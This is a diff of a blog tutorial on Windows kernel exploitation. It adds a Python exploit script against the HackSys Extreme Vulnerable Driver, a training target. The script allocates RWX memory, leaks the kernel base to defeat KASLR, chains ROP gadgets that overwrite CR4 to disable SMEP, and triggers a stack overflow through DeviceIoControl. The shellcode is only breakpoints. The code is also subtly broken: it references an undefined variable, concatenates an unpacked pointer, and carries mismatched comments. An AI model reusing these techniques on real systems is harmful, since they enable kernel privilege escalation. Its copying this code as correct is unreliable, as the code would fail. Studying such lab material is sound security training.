@@ -283,7 +283,108 @@ So, first order of business is to get our intended CR4 value stored in RCX. A ni
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_21.png" alt="">
 
-We have our two ROP gadgets let's get this updated inside of an exploit script.
+We have our two ROP gadgets let's get this updated inside of an exploit script with breakpoints on our shellcode.
 
 ```python
+import struct
+import sys
+import os
+from ctypes import *
+
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+psapi = windll.Psapi
+
+
+payload = bytearray(
+    "\xCC" * 50
+)
+
+# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying our shellcode in that region.
+# We also need to bypass SMEP before calling this shellcode
+print "[+] Allocating RWX region for shellcode"
+ptr = kernel32.VirtualAlloc(
+    c_int(0),                         # lpAddress
+    c_int(len(payload)),              # dwSize
+    c_int(0x3000),                    # flAllocationType
+    c_int(0x40)                       # flProtect
+)
+
+# Creates a ctype variant of the payload (from_buffer)
+c_type_buffer = (c_char * len(payload)).from_buffer(payload)
+
+print "[+] Copying shellcode to newly allocated RWX region"
+kernel32.RtlMoveMemory(
+    c_int(ptr),                       # Destination (pointer)
+    c_type_buffer,                    # Source (pointer)
+    c_int(len(payload))               # Length
+)
+
+# Need kernel leak to bypass KASLR
+# Using Windows API to enumerate base addresses
+# We need kernel mode ROP gadgets
+
+# c_ulonglong because of x64 size (unsigned __int64)
+base = (c_ulonglong * 1024)()
+
+print "[+] Calling EnumDeviceDrivers()..."
+
+get_drivers = psapi.EnumDeviceDrivers(
+    byref(base),                      # lpImageBase (array that receives list of addresses)
+    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
+    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
+)
+
+# Error handling if function fails
+if not base:
+    print "[+] EnumDeviceDrivers() function call failed!"
+    sys.exit(-1)
+
+# The first entry in the array with device drivers is ntoskrnl base address
+kernel_address = base[0]
+
+print "[+] Found kernel leak!"
+print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))
+
+# Offset to control execution
+input_buffer = "\x41" * 2056
+
+# SMEP says goodbyte
+# First ROP Gadget will go here
+input_buffer += struct.pack('<Q', kernel_address + 0x1475824)    # pop ecx; ret ; nt!HvlEndSystemInterrupt+0x1e
+input_buffer += struct.pack('<Q', 0x00000000000506f8)            # Intended CR4 value
+input_buffer += struct.pack('<Q', kernel_address + 0x4265221)    # mov cr4, rcx ; ret ; nt!KiEnableXSave+0x6a08
+input_buffer += ptr                                              # Location of user mode shellcode
+
+# Crash the application
+input_buffer += "\x90" * (4000 - len(padding))
+
+input_buffer_length = len(input_buffer)
+
+
+# 0x222003 = IOCTL code that will jump to TriggerStackOverflow() function
+# Getting handle to driver to return to DeviceIoControl() function
+print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
+handle = kernel32.CreateFileA(
+    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
+    0xC0000000,                         # dwDesiredAccess
+    0,                                  # dwShareMode
+    None,                               # lpSecurityAttributes
+    0x3,                                # dwCreationDisposition
+    0,                                  # dwFlagsAndAttributes
+    None                                # hTemplateFile
+)
+
+# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
+print "[+] Interacting with the driver..."
+kernel32.DeviceIoControl(
+    handle,                             # hDevice
+    0x222003,                           # dwIoControlCode
+    input_buffer,                       # lpInBuffer
+    input_buffer_length,                # nInBufferSize
+    None,                               # lpOutBuffer
+    0,                                  # nOutBufferSize
+    byref(c_ulong()),                   # lpBytesReturned
+    None                                # lpOverlapped
+)
 ```
